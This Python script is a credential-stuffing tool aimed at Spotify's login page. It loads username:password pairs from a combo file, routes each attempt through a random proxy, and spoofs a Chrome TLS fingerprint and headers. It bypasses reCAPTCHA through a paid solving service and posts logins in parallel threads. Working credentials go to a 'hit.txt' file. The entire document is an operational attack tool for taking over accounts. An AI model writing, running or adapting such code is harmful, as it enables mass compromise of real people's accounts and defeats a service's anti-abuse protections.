import tls_client
from loguru import logger
from bs4 import BeautifulSoup
import json
from concurrent.futures import ThreadPoolExecutor
import random
import requests
import time

CAPSOLVER_APİ_KEY = "CapSolverApiKey"

site_key = "6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39" 
site_url = "https://accounts.spotify.com/"  


def capsolver():
    payload = {
        "clientKey": CAPSOLVER_APİ_KEY,
        "task": {
            "type": 'ReCaptchaV3TaskProxyLess',
            "websiteKey": site_key,
            "websiteURL": site_url,
            "pageAction": "accounts/login",
        }
    }
    res = requests.post("https://api.capsolver.com/createTask", json=payload)
    resp = res.json()
    task_id = resp.get("taskId")
    if not task_id:
        print("Failed to create task:", res.text)
        return
    print(f"Got taskId: {task_id} / Getting result...")

    while True:
        time.sleep(1)  
        payload = {"clientKey": CAPSOLVER_APİ_KEY, "taskId": task_id}
        res = requests.post("https://api.capsolver.com/getTaskResult", json=payload)
        resp = res.json()
        status = resp.get("status")
        if status == "ready":
            return resp.get("solution", {}).get('gRecaptchaResponse')
        if status == "failed" or resp.get("errorId"):
            print("Solve failed! response:", res.text)
            return



def login_attempt(combo):
    with open("proxy.txt", "r", encoding="utf-8") as proxy_file:
        proxy_list = proxy_file.readlines()

    user, passw = combo.strip().split(":")
    
    random_proxy = random.choice(proxy_list)

    proxies = {
        'http': f'http://{random_proxy}',
        'https': f'http://{random_proxy}',
    }

    s = tls_client.Session(
        client_identifier="chrome112",
        random_tls_extension_order=True
    )
    s.proxies.update(proxies)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    response = s.get('https://accounts.spotify.com/login', headers=headers)
    csrf = s.cookies.get("sp_sso_csrf_token")

    soup = BeautifulSoup(response.text, 'html.parser')
    meta_tag = soup.find('meta', {'id': 'bootstrap-data'})
    sp_bootstrap_data = meta_tag['sp-bootstrap-data']
    data = json.loads(sp_bootstrap_data.replace('&quot;', '"'))
    flow_ctx = data.get('flowCtx')
    token = capsolver()

    if token:
        headers = {
            'accept': 'application/json',
            'accept-language': 'tr-TR,tr;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://accounts.spotify.com',
            'priority': 'u=1, i',
            'referer': 'https://accounts.spotify.com/tr/login',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-csrf-token': csrf,
        }

        data = {
            'username': user,
            'password': passw,
            'continue': 'https://accounts.spotify.com/tr/status',
            'recaptchaToken': token,
            'flowCtx': flow_ctx,
        }

        response = s.post('https://accounts.spotify.com/login/password', headers=headers, data=data)
        result = response.json()

        if result.get("result") == "ok":
            logger.success(f"Login successful for user: {user}")
            open("hit.txt","a",encoding="utf-8").write(f"{user}:{passw}\n")
        else:
            logger.error(f"Login failed for user: {user}, Error: {result.get('error')}")
    else:
        logger.error("Captcha solver Error")
if __name__ == "__main__":

    th = int(input("How Many Thrad :"))
    with open("combo.txt", "r", encoding="utf-8") as file:
        combos = file.readlines()

    with ThreadPoolExecutor(max_workers=th) as executor:
        executor.map(login_attempt, combos)